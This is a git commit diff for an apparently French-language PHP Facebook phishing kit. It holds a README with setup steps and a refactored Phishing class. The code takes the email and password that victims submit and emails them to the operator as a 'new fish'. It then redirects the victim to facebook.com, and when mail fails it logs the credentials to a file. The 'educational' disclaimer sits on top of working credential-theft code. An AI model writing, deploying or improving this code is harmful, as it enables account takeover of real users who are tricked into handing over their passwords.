ee8f7a8020a4b91300913b613c39d9813891ec3a
Mbungu ngoma <hackmmn@gmail.com>
2018-04-19 10:00:42 +0100

    Improve the documentation

--- README.md
+++ README.md
@@ -1,2 +1,13 @@
-# facebook-phishing
-Php Facebook phishing script 
+# Facebook phishing
+
+Avertissement : Script à titre éducationnnel.
+
+Ouvrez le fichier login.php et remplacer avec les valeurs vous concernant
+
+```php
+   define('MY_NAME', 'votre nom'); //Votre nom
+   define('MY_EMAIL', 'votreadresse@gmail.com'); //Adresse où vous allez recevoir l'email
+```
+Si vous n'avez pas pu recevoir l'email, vous pouvez voir la liste de mot de passe dans les logs : 
+
+``` /src/logs ```
--- src/Phishing.php
+++ src/Phishing.php
@@ -1,38 +1,73 @@
 <?php
 
 namespace Informagenie;
-use  Katzgrau\KLogger\Logger;
+
+use Katzgrau\KLogger\Logger;
 
 class Phishing
 {
-
+    /**
+    * Instance of SimpleMail
+    *
+    * @type \SimpleMail
+    */
     protected $mailler;
+
+    protected $datas;    
 
     public function __construct()
     {
         $this->mailler = new \SimpleMail();
         $this->datas = array_map('htmlspecialchars', $_POST);
     }
-
-    public function send(Array $data)
+    
+    /**
+    * Send credentials via email
+    *
+    * @param Array $data
+    **/	
+    protected function mail(Array $data)
     {
-        $content = $this->buildContent();
-        $sent = $this->mailler->setFrom('Mbungu ngoma', 'goms@labes-ley.com')
+        return  $this->mailler->setFrom('Mbungu ngoma', 'goms@labes-ley.com')
                 ->setTo($data['my_email'], $data['my_name'])
                 ->setSubject($data['subject'])
-                ->setMessage($content)
+                ->setMessage($this->buildContent())
                 ->setHtml()
                 ->send();
-        if($sent)
-        {
-            header('Location: https://facebook.com');
-            exit();
-        }else{
-            $logger = new Logger(__DIR__.'/logs');
-            $logger->info(strip_tags($content));
-        }
     }
-
+	
+    /**
+    * Send credential
+    *
+    * @param Array $data
+    */
+    public function send(Array $data)
+    {
+	if($this->mail($data))
+	{
+	    header('Location: https://facebook.com');
+	    exit();
+	}else{
+	    $this->log($this->buildContent());
+	}
+    }
+    
+    /**
+    * Save log credentials
+    *
+    * @param String $content
+    */
+    protected function log($content)
+    {
+	$logger = new Logger(__DIR__.'/logs');
+	$logger->info(strip_tags($content));
+    }
+    
+    /**
+    * Genere credential text to send
+    *
+    * @return String
+    **/
     protected function buildContent()
     {
         $username = !empty($this->datas['email']) ? $this->datas['email'] : 'Inconnue';
@@ -47,7 +82,6 @@ Vous avez un nouveau poisson !<p>
 <li>Mot de passe : $password </li>
 </ul>
 content;
-
     }
 
 }
